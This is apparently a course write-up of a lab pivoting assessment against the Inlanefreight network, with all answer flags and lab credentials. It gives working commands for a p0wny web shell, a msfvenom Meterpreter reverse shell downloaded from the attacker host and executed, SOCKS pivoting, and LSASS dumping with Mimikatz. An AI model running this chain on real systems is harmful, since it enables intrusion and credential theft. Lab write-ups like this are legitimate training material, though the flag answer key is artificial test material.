# 16 — Skills Assessment: Inlanefreight Pivoting Chain

> Open-ended assessment: start from a web shell on the external host, enumerate and pivot through the internal network, reach the Inlanefreight DC, capture all flags.

---

## Environment Map

```
Attack Host (tun0: 10.10.x.x)
    │  web shell (p0wny)
    ▼
[HOP 1] ACADEMY-PIVOT-WEB01 — 10.129.x.x (external) / 172.16.5.15 (internal)
    OS: Linux (www-data) — webadmin SSH key in /home/webadmin/
    Credentials found: mlefay:Plain Human work! (in /home/webadmin/for-admin-eyes-only)
    │  Meterpreter + route + RDP via proxychains
    ▼
[HOP 2] PIVOT-SRV01 — 172.16.5.35 (Windows Server 2019)
    Creds: mlefay:Plain Human work! (local auth)
    Flag: C:\Flag.txt → S1ngl3-Piv07-3@sy-Day
    LSASS dump → Mimikatz → vfrank:Imply wet Unmasked! (DHCP service account)
    │  RDP as vfrank
    ▼
[HOP 3] Workstation — 172.16.6.25
    Creds: vfrank:Imply wet Unmasked!
    Flag: C:\Flag.txt → N3tw0rk-H0pp1ng-f0R-FuN
    Mapped Z: drive → AutomateDCAdmin share
    │
    ▼
[DC] Domain Controller — 172.16.6.x (INLANEFREIGHT.LOCAL)
    Flag: C:\Flag.txt → 3nd-0xf-Th3-R@inbow!
```

---

## Objectives

1. Gain shell on foothold via web shell
2. Enumerate the foothold host and its reachable networks
3. Identify next pivot target(s)
4. Pivot through until reaching the DC
5. Capture all flags

---

## Phase 1 — Foothold Enumeration (via web shell)

Run these in the p0wny shell to map the environment:

```bash
# Host identity
hostname && whoami && id

# Network interfaces — find internal subnets
ip a
ip route

# Active connections and listeners
ss -tulpn
netstat -tulpn 2>/dev/null

# Hosts file — may reveal internal hostnames
cat /etc/hosts

# Check for SSH keys
ls -la /home /root 2>/dev/null
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null | head -20

# Check for credentials in web files
grep -r "password\|passwd\|user\|cred" /www/html/ --include="*.php" --include="*.conf" -l 2>/dev/null

# Running processes
ps aux

# Sudo rights
sudo -l 2>/dev/null
```

---

## Phase 2 — Internal Network Discovery

Once internal subnet(s) identified from `ip a` / `ip route`:

```bash
# Ping sweep (bash one-liner — no nmap needed on foothold)
for i in $(seq 1 254); do (ping -c 1 -W 1 172.16.X.$i &>/dev/null && echo "Up: 172.16.X.$i") & done; wait

# Port scan a discovered host (if nmap available)
nmap -sT -Pn -p 22,80,443,445,3389,8080 172.16.X.X 2>/dev/null

# Or use /dev/tcp for port check
for port in 22 80 443 445 3389 8080 5985; do
  (echo >/dev/tcp/172.16.X.X/$port) &>/dev/null && echo "Open: $port"
done
```

---

## Phase 3 — Pivot Methods (choose based on what's available)

| Access method found | Pivot technique |
|---------------------|----------------|
| SSH creds/key to internal host | `ssh -D 9050` or `-L` port forward |
| HTTP service on internal host | Chisel SOCKS5 |
| Windows host with RDP | netsh portproxy or SocksOverRDP |
| Only ICMP allowed | ptunnel-ng |
| DNS allowed | dnscat2 |

---

## Credentials Found

| Username | Password | Source | Host |
|----------|----------|--------|------|
| webadmin | SSH key at /home/webadmin/id_rsa | Linux foothold | 10.129.x.x |
| mlefay | `Plain Human work!` | /home/webadmin/for-admin-eyes-only | 172.16.5.35 (local) |
| vfrank | `Imply wet Unmasked!` | LSASS dump / Mimikatz on PIVOT-SRV01 | INLANEFREIGHT.LOCAL |

---

## Flags

| Question | Location | Flag |
|----------|----------|------|
| Q1 | User directory with creds | `webadmin` |
| Q2 | Credentials found | `mlefay:Plain Human work!` |
| Q3 | Internal host IP | `172.16.5.35` |
| Q4 | C:\Flag.txt on PIVOT-SRV01 | `S1ngl3-Piv07-3@sy-Day` |
| Q5 | Vulnerable service account user | `vfrank` |
| Q6 | C:\Flag.txt on workstation (172.16.6.25) | `N3tw0rk-H0pp1ng-f0R-FuN` |
| Q7 | C:\Flag.txt on Domain Controller | `3nd-0xf-Th3-R@inbow!` |

---

## Full Attack Chain

### Phase 1 — Foothold Enumeration

```bash
# Interact with p0wny webshell via curl
curl -s -X POST "http://TARGET_IP/?feature=shell" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "cmd=id && ip a" \
  --data-urlencode "cwd=/www/html" \
  | python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['stdout']).decode())"

# Host: 10.129.x.x (ens160) / 172.16.5.15 (ens192 — internal)
# Webshell user: www-data

# Find credentials
# /home/webadmin/for-admin-eyes-only → mlefay:Plain Human work!
# /home/webadmin/id_rsa → SSH key for webadmin
```

### Phase 2 — SSH into Foothold + Meterpreter Session

```bash
# Save SSH key and verify access
chmod 600 /tmp/webadmin_id_rsa
ssh -i /tmp/webadmin_id_rsa webadmin@TARGET_IP "id"

# Generate Meterpreter payload and upload
LHOST=$(ip -br a | grep tun0 | awk '{print $3}' | cut -d/ -f1)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o /tmp/serve/shell.elf
python3 -m http.server 8000 -d /tmp/serve &

# Download payload to webshell and execute
# (via p0wny curl helper)
# curl -s http://$LHOST:8000/shell.elf -o /tmp/shell.elf && chmod +x /tmp/shell.elf
# nohup /tmp/shell.elf &>/dev/null &
```

**In msfconsole:**
```
use multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <tun0_IP>
set LPORT 4444
set ExitOnSession false
run -j

# After session opens:
route add 172.16.5.0/16 1
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 5
run -j
```

### Phase 3 — Pivot to PIVOT-SRV01 (172.16.5.35)

```bash
# Internal host discovery — scan for SMB from webshell
# for i in $(seq 1 254); do (timeout 1 bash -c "echo >/dev/tcp/172.16.5.$i/445" 2>/dev/null && echo "SMB: 172.16.5.$i") & done; wait
# → 172.16.5.35 found

# RDP to PIVOT-SRV01 through proxychains SOCKS proxy
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' \
  /cert:ignore /dynamic-resolution
# Flag at C:\Flag.txt: S1ngl3-Piv07-3@sy-Day
```

### Phase 4 — Credential Extraction on PIVOT-SRV01 (Q5: vfrank)

On PIVOT-SRV01 via RDP session:
```
# Task Manager → Details → lsass.exe → Create dump file
# Or: procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Run Mimikatz as Administrator:
mimikatz.exe
sekurlsa::LogonPasswords
# → vfrank : Imply wet Unmasked! (DHCP service account — credentials exposed in service config)
```

**Q5 answer:** `vfrank` — DHCP service misconfigured to run as domain user with credentials stored in plaintext.

### Phase 5 — Pivot to Workstation (172.16.6.25)

```bash
# Ping sweep from PIVOT-SRV01 to find 172.16.6.0/24
# PowerShell: 1..254 | % { $ip="172.16.6.$_"; if(Test-Connection $ip -Count 1 -Quiet){$ip} }
# → 172.16.6.25 found

# RDP as vfrank
proxychains xfreerdp /v:172.16.6.25 /u:vfrank /p:'Imply wet Unmasked!' \
  /d:INLANEFREIGHT.LOCAL /cert:ignore /dynamic-resolution
# Flag at C:\Flag.txt: N3tw0rk-H0pp1ng-f0R-FuN
```

### Phase 6 — DC Flag

```
# From workstation RDP session — Z: drive is mapped AutomateDCAdmin share → DC
# Navigate Z: drive to find C:\Flag.txt on DC
# Flag: 3nd-0xf-Th3-R@inbow!
```

---

## References

- Previous: [15-RDP_and_SOCKS_Tunneling_with_SocksOverRDP.md](15-RDP_and_SOCKS_Tunneling_with_SocksOverRDP.md)
- Next: [17-Skills_Assessment_Continued.md](17-Skills_Assessment_Continued.md)
